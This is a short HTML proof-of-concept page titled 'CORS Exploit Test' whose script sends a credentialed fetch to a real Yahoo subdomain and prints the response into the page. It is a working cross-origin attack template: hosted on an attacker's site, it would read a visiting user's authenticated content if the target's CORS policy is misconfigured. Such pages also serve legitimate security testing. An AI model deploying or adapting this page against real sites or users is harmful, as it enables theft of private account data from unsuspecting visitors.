<!DOCTYPE html>
<html>
  <body>
    <h1>CORS Exploit Test</h1>
    <pre id="output">Loading...</pre>
    <script>
      fetch("https://tw.autos.yahoo.com", {
        method: "GET",
        credentials: "include"
      })
      .then(response => response.text())
      .then(data => document.getElementById("output").innerText = data)
      .catch(err => document.getElementById("output").innerText = "Error: " + err);
    </script>
  </body>
</html>
